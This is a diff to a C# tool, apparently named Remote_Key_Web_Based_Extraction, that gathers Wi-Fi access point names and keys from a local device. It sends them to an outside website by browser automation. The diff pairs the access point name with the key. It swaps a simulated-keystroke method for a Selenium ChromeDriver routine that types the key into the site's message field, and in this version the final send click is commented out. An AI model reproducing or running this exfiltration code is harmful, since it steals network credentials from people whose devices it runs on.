@@ -30,7 +30,7 @@ namespace Remote_Key_Web_Based_Extraction
             Console.WriteLine("Opportunity to obfuscate key_content:");
             //string obfuscation = Console.ReadLine();
             //key_content += obfuscation;
-            main_program.web_content_key_extraction(key_content);
+            main_program.web_content_key_extraction(access_point_names[0] + ":" + key_content);
         }
 
         public async Task extract_access_point_names()
@@ -76,25 +76,28 @@ namespace Remote_Key_Web_Based_Extraction
 
         public void web_content_key_extraction(string key_content)
         {
+        /*
 
-            // System.Diagnostics.Process.Start(string fileName, string arguments);
+        // System.Diagnostics.Process.Start(string fileName, string arguments);
 
-            //https://stackoverflow.com/questions/49529559/cant-open-link-in-c-sharp
-            System.Diagnostics.Process.Start("cmd", "/c start https://anthony-t-n.github.io");
+        //https://stackoverflow.com/questions/49529559/cant-open-link-in-c-sharp
+        System.Diagnostics.Process.Start("cmd", "/c start https://anthony-t-n.github.io");
 
-            // https://stackoverflow.com/questions/25987445/installed-inputsimulator-via-nuget-no-members-accessible
-            InputSimulator s = new InputSimulator();
+        // https://stackoverflow.com/questions/25987445/installed-inputsimulator-via-nuget-no-members-accessible
+        InputSimulator s = new InputSimulator();
 
-            s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.F5);
-            // 22 tab presses
-            for (int i = 0; i <= 22; i++)
-            {
-                s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.TAB);
-            }
-            s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.VK_4);
-            s.Keyboard.TextEntry(key_content);
+        s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.F5);
+        // 22 tab presses
+        for (int i = 0; i <= 22; i++)
+        {
+            s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.TAB);
+        }
+        s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.VK_4);
+        s.Keyboard.TextEntry(key_content);
+        */
 
-            // Issues with Selenium. Requires driver executables on target device.
+        // Issues with Selenium. Requires driver executables on target device.
+        // https://stackoverflow.com/questions/57762289/why-is-chromedriver-working-in-debug-mode-but-not-on-release
             /*
             
             EdgeOptions edgeOptions = new EdgeOptions();
@@ -104,16 +107,17 @@ namespace Remote_Key_Web_Based_Extraction
             options.UseInPrivateBrowsing = true;
             var current_driver = new EdgeDriver(options);
              
+            */
             try
             {
                 // https://stackoverflow.com/questions/45130993/how-to-start-chromedriver-in-headless-mode
-                var chromeOptions = new ChromeOptions();
-                chromeOptions.AddArguments("headless");
+                //var chromeOptions = new ChromeOptions();
+                //chromeOptions.AddArguments("headless");
                 Console.WriteLine("[=] Attempting to try Chrome");
-                OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver(chromeOptions);
+                OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver();
                 current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
                 current_driver.FindElement(By.Name("message")).SendKeys(key_content);
-                current_driver.FindElement(By.Name("send")).Click();
+                //current_driver.FindElement(By.Name("send")).Click();
                 current_driver.Quit();
             }
             catch (Exception e)
@@ -131,8 +135,6 @@ namespace Remote_Key_Web_Based_Extraction
             {
                 Console.WriteLine("[+] Successfully extracted content key from local device");
             }
-
-            */
         }
     }
 }
